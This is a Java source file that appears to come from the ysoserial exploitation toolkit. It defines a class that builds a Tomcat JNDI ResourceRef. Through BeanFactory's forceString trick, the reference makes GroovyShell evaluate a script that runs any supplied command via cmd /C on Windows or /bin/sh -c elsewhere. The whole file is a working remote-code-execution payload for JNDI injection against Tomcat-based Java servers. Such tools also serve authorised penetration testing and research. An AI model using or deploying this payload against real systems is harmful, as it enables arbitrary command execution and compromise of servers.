package ysoserial.bullet.jndi;

import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

public class TomcatGroovyShellRef implements TomcatRef {

    @Override
    public ResourceRef getObject(String command) throws Exception {
        String payload = "if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
            "   ['cmd','/C', '${cmd}'].execute();\n" +
            "} else {\n" +
            "    ['/bin/sh','-c', '${cmd}'].execute();\n" +
            "}";
        payload = payload.replace("${cmd}", command);

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell",
            null, "", "",true,
            "org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x",payload));
        return ref;
    }
}
